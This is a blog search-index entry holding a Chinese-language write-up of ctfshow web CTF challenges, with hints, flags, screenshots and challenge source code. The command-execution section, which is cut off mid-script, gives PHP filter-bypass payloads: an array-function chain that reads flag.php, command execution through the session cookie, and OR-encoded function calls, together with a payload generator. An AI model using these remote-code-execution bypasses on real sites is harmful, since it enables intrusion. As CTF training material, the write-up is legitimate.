<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【ctfshow】web篇wp记录（持续更新）</title>
    <url>/2021/07/13/%E3%80%90ctfshow%E3%80%91web%E7%AF%87wp%E8%AE%B0%E5%BD%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><blockquote>
<p>右键查看源代码即可</p>
<p>ctrl+u</p>
</blockquote>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><blockquote>
<p>1、关掉javascript然后查看源码</p>
<p>2、ctrl+shift+i</p>
<p>3、view-source:</p>
<p>4、点击更过工具，开发者工具查看元素获得页面注释通过开发者工具查看网络response结果获得flag</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f10dd25185cb296b3d40c25c8a55e470.png" alt="image-20210601202056830"></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><blockquote>
<p>开发者工具network抓包查看http协议头里面有个flag协议头，提交即可burpsuite抓包也可以</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0760a2285985202b90199b57e9a50161.png" alt="image-20210601202158461"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d97503fc40dff91069727180d198f67f.png" alt="image-20210601202315569"></p>
<blockquote>
<p>ctfshow{53968446-5c49-4e0a-a6af-3df14463c786}</p>
</blockquote>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><blockquote>
<p>直接上手君子协议</p>
<p>ctfshow{ca6071e4-33fd-4e4b-8f0e-c08bc2b1e7b1}</p>
</blockquote>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><blockquote>
<p>考虑了半天，提示phps源码泄露</p>
<p>还是得看tips</p>
<p>ctfshow{70bc7249-1347-4d63-9f62-b1c752661b03}</p>
</blockquote>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><blockquote>
<p>/<a href="http://www.zip，下载源码，然后网页上访问http://55a647d5-d0fc-40ec-93e4-edd2b997ed11.challenge.ctf.show:8080/fl000g.txt" target="_blank" rel="noopener">www.zip，下载源码，然后网页上访问http://55a647d5-d0fc-40ec-93e4-edd2b997ed11.challenge.ctf.show:8080/fl000g.txt</a></p>
<p>ctfshow{6a630fef-804b-4f6a-a892-e3e3f0f5fe6f}</p>
</blockquote>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><blockquote>
<p>考部署环境，时/.git/泄露代码</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6fc7799bd8f1806b339ea8fbc43d01d1.png" alt="image-20210601203750323"></p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><blockquote>
<p>是svn代码泄露，url/.svn/，后面这个/一定要加，不然就进不去</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/36cd8250a04519f82477cbc7b0cfadd7.png" alt="image-20210601205103745"></p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote>
<p>linux中vim访问缓冲index.php.swp信息泄露</p>
<p>ctfshow{6100df72-a079-4f17-97b8-56886e12c786}</p>
</blockquote>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><blockquote>
<p>cookie中</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/94a5d82a2cc9ae8e91c06af428317502.png" alt="image-20210601205626532"></p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><blockquote>
<p><a href="https://zijian.aliyun.com/" target="_blank" rel="noopener">https://zijian.aliyun.com/</a> 查域名</p>
<p><a href="http://dbcha.com/?t=1625617640" target="_blank" rel="noopener">http://dbcha.com/?t=1625617640</a> 查域名</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d895049d59178cfb8b82e1e76da663c2.png" alt="image-20210601210418143"></p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><blockquote>
<p>先看一波君子协议</p>
<p>然后admin和他手机是密码</p>
<p>robots.txt</p>
</blockquote>
<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><blockquote>
<p>document下载</p>
<p>技术文档</p>
</blockquote>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><blockquote>
<p>看题目，写editor编译器泄露，查看源码搜索找到editor</p>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707083802791.png" alt="image-20210707083802791"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707083825874.png" alt="image-20210707083825874"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707083848916.png" alt="image-20210707083848916"></p>
<blockquote>
<p>通过路径找到flag</p>
<p><a href="http://c8ed7f63-f69c-4c94-9a34-5988bbdf9155.challenge.ctf.show:8080/nothinghere/fl000g.txt" target="_blank" rel="noopener">http://c8ed7f63-f69c-4c94-9a34-5988bbdf9155.challenge.ctf.show:8080/nothinghere/fl000g.txt</a></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707083923575.png" alt="image-20210707083923575"></p>
</blockquote>
<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><blockquote>
<p>通过邮箱查地址</p>
<p>改密码：西安</p>
</blockquote>
<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><blockquote>
<p>进入tz.php这是默认</p>
<p>然后再点击phpinfo按钮里面有flag</p>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707084326227.png" alt="image-20210707084326227"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707084345975.png" alt="image-20210707084345975"></p>
<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><blockquote>
<p>ping <a href="http://www.ctfshow.com" target="_blank" rel="noopener">www.ctfshow.com</a></p>
</blockquote>
<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><blockquote>
<p><a href="http://d3be1272-066a-49ff-a6e8-b8def169e782.challenge.ctf.show:8080/110.php" target="_blank" rel="noopener">http://d3be1272-066a-49ff-a6e8-b8def169e782.challenge.ctf.show:8080/110.php</a></p>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210602184900428.png" alt="image-20210602184900428"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707090523103.png" alt="image-20210707090523103"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210602184928433.png" alt="image-20210602184928433"></p>
<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><blockquote>
<p>绕过前端JS直接提交hash使用hackbar的post：pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&amp;username=admin</p>
<p>post传参</p>
</blockquote>
<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><blockquote>
<p>mdb文件asp+access数据库文件泄露</p>
<p>db/db.mdb，打开</p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707092002656.png" alt="image-20210707092002656"></p>
</blockquote>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><blockquote>
<p>tomcat认证爆破之burp custom iterator</p>
<ul>
<li><strong>第一种方式-burp使用之自定义迭代器</strong></li>
</ul>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/600eecb8b19793f8f443b4f41eda1b29.png" alt="image-20210602075713742"></p>
<blockquote>
<p>base64解密  就是 admin:admin形式，<strong>我输入的账号和密码就是admin和admin</strong></p>
<p>说明这是base64加密</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/53682bb5b322a960c84dbb25538ffa37.png" alt="image-20210602075845504"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8f9d777faa9e44dee92737070636d375.png" alt="image-20210602080000069"></p>
<p><strong>position(1)</strong></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/17cf3e0095d4ac83a12439bba402ec9c.png" alt="image-20210602080029936"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6cb45046c04b2427f0cef861b64182f9.png" alt="image-20210602080057955"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/64a2db62fc7659c3a9ed2e9722a29f97.png" alt="image-20210602080159630"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210602082330741.png" alt="image-20210602082330741"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210602082906219.png" alt="image-20210602082906219"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a32cca75293441b030b9cf291a0a347d.png" alt="image-20210602080221754"></p>
<blockquote>
<ul>
<li>第二种方式-直接固定前缀<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210709091316243.png" alt="image-20210709091316243"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210709091404655.png" alt="image-20210709091404655"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210709091423940.png" alt="image-20210709091423940"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210709091444181.png" alt="image-20210709091444181"></li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><blockquote>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210709091949204.png" alt="image-20210709091949204"></li>
<li>说是爆破子域名用这个网站：<a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a></li>
<li>第二种是利用搜索引擎的语法进行搜索<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210709092027358.png" alt="image-20210709092027358"></li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><blockquote>
<ul>
<li><p>源代码</p>
<ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210710175437343.png" alt="image-20210710175437343"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'token'</span>]))&#123;</span><br><span class="line">    $token = md5($_GET[<span class="string">'token'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



</li>
</ul>
</li>
</ul>
<ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210710175548108.png" alt="image-20210710175548108"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210710175616862.png" alt="image-20210710175616862"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210710175638605.png" alt="image-20210710175638605"></p>
</li>
</ul>
</blockquote>
<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><blockquote>
<ul>
<li><strong>mt_srand(seed) 根据seed的值会一直不变，不过不同的php版本会导致不同的结果</strong></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210711101447840.png" alt="image-20210711101447840"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210711101522334.png" alt="image-20210711101522334"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210711101557022.png" alt="image-20210711101557022"></li>
</ul>
</blockquote>
<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><blockquote>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210712092257701.png" alt="image-20210712092257701"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210712092323692.png" alt="image-20210712092323692"></li>
<li><strong>使用网上找的程序php_mt_seed随机种子破解<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a></strong></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210712092530617.png" alt="image-20210712092530617"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210712094851762.png" alt="image-20210712094851762"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210712094952070.png" alt="image-20210712094952070"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210712095025135.png" alt="image-20210712095025135"></li>
</ul>
</blockquote>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210715215131122.png" alt="image-20210715215131122"></p>
</blockquote>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><blockquote>
<ul>
<li>得到了名单，明显缺少出生年月日<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210715215249427.png" alt="image-20210715215249427"></li>
</ul>
</li>
<li><strong>中间缺少8位数，利用1990年到2000年之间的出生日期构造第一名学生的身份证号payload</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y=<span class="number">1990</span>; $y &lt; <span class="number">2000</span>; $y++) &#123; </span><br><span class="line">	<span class="keyword">for</span> ($m=<span class="number">1</span>; $m &lt; <span class="number">13</span>; $m++) &#123; </span><br><span class="line">		<span class="keyword">if</span> ($m &lt; <span class="number">10</span>) &#123;</span><br><span class="line">			$m = <span class="string">"0"</span>.$m;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> ($d=<span class="number">1</span>; $d &lt; <span class="number">32</span>; $d++) &#123; </span><br><span class="line">			<span class="keyword">if</span> ($d &lt; <span class="number">10</span>) &#123;</span><br><span class="line">				$d = <span class="string">"0"</span>.$d;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"621022"</span>.$y.$m.$d.<span class="string">"5237"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210715220453961.png" alt="image-20210715220453961"></p>
<ul>
<li>burp跑一遍<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210715220728598.png" alt="image-20210715220728598"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210715220802214.png" alt="image-20210715220802214"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210715220834627.png" alt="image-20210715220834627"></li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><blockquote>
<ul>
<li><strong>发现index会跳转0/1/2.txt</strong></li>
<li><strong>正常网站是index.php</strong></li>
<li><strong>报错0和1的深度试试</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210715221957039.png" alt="image-20210715221957039"></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><blockquote>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707102447577.png" alt="image-20210707102447577"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707102530786.png" alt="image-20210707102530786"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707102544429.png" alt="image-20210707102544429"></li>
</ul>
</blockquote>
<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><blockquote>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707103118631.png" alt="image-20210707103118631"></li>
</ul>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707103144554.png" alt="image-20210707103144554"></li>
</ul>
</blockquote>
<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><blockquote>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707105029901.png" alt="image-20210707105029901"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707105220231.png" alt="image-20210707105220231"></li>
</ul>
</blockquote>
<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><blockquote>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707110929422.png" alt="image-20210707110929422"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707111000644.png" alt="image-20210707111000644"></li>
</ul>
</blockquote>
<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><blockquote>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707210348568.png" alt="image-20210707210348568"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707210419087.png" alt="image-20210707210419087"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707210435823.png" alt="image-20210707210435823"></li>
</ul>
</blockquote>
<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><blockquote>
<ul>
<li>和33题一样</li>
</ul>
</blockquote>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><blockquote>
<ul>
<li>和32题一样</li>
</ul>
</blockquote>
<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><blockquote>
<ul>
<li>和32题一样就是把1换成a</li>
</ul>
</blockquote>
<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><blockquote>
<ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707215121215.png" alt="image-20210707215121215"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707215132578.png" alt="image-20210707215132578"></p>
</li>
</ul>
</blockquote>
<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><blockquote>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707215958632.png" alt="image-20210707215958632"></li>
</ul>
</blockquote>
<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><blockquote>
<ul>
<li>和38一样</li>
</ul>
</blockquote>
<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">".php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>根据提示套娃方法</strong><ul>
<li><strong>show_source(next(array_reverse(scandir(pos(localeconv())))));</strong></li>
</ul>
</li>
<li><strong>解析：show_source(“flag.php”);可以直接显示当前文件</strong><ul>
<li><strong>localeconv()数组中第一个元素是.可以取路径</strong></li>
<li><strong>pos()就是取数据中第一个元素</strong></li>
<li><strong>array_reverse()将数组倒序利用next()取flag.php就执行了flag.php</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210716180426690.png" alt="image-20210716180426690"></li>
</ul>
</li>
</ul>
</li>
<li><strong>根据cookie命令执行方法</strong><ul>
<li><strong>c=session_start()<em>;system(session_id());</em> passid=ls</strong></li>
<li><strong>解析利用session会话进行获取passid中的ls来进行命令执行</strong></li>
<li><strong>但是不能正常执行tac flag.php</strong></li>
</ul>
</li>
<li><strong>根据post传参来进行命令执行</strong><ul>
<li><strong>利用-print_r(get_defined_vars())输出所有变量来查看</strong></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210716182731071.png" alt="image-20210716182731071"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210716182805741.png" alt="image-20210716182805741"></li>
<li><strong>利用next和array_pop来取出值</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210716182918300.png" alt="image-20210716182918300"></li>
</ul>
</li>
<li><strong>eval没有被禁用，尝试命令执行</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210716182955897.png" alt="image-20210716182955897"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210716183112793.png" alt="image-20210716183112793"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_POST[<span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"echo($c);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>过滤了数字和字母和一些其他字符我们还是可以利用或运算来进行绕过，例如A的ascii码是65，用羽师傅的代码写的是64|1就得到了65，来构造payload</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717105826825.png" alt="image-20210717105826825"></p>
<blockquote>
<ul>
<li><p><strong>经过测试，想要在php中实现或运算，实际上服务器上会进行url解码，所以需要用十六进制的字符编码利用或运算进行绕过前端代码验证，写了个代码进行验证，因为phpinfo()可以使用(‘phpinfo’)()形式执行所以构造了</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: GuYing</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021/7/17</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">$c = $_GET[<span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($c);"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(('%40'|'%10').('%40'|'%08').('%40'|'%10').('%40'|'%09').('%40'|'%0e').('%40'|'%06').('%40'|'%0F'))()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>可以直接绕过当(’PHPINFO‘)()执行构造</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">payload1 ?c&#x3D;((&#39;%40&#39;|&#39;%10&#39;).(&#39;%40&#39;|&#39;%08&#39;).(&#39;%40&#39;|&#39;%10&#39;).(&#39;%40&#39;|&#39;%09&#39;).(&#39;%40&#39;|&#39;%0e&#39;).(&#39;%40&#39;|&#39;%06&#39;).(&#39;%40&#39;|&#39;%0F&#39;))()</span><br><span class="line"></span><br><span class="line">payload2 ?c&#x3D;((&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;))()</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717110940082.png" alt="image-20210717110940082"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717144624204.png" alt="image-20210717144624204"></p>
</li>
<li><p>沿用羽师傅的代码</p>
</li>
<li><p><strong>解释一下：先是ascill码256个字符的所对应的16进制数，然后利用preg_match排除他们本身的二进制字符串是属于被过滤范围内的，可以大量减少运行时间，然后再读入到rce_or.txt中，利用python写exp进行利用。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: GuYing</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021/7/17</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//异或</span></span><br><span class="line">$myfile = fopen(<span class="string">"rce_or.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">$contents = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123; </span><br><span class="line">	<span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt; <span class="number">256</span> ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($i&lt;<span class="number">16</span>) &#123;</span><br><span class="line">			$hex_i=<span class="string">'0'</span>.dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$hex_i=dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			$hex_j=<span class="string">'0'</span>.dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$hex_j = dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		$preg = <span class="string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span>;</span><br><span 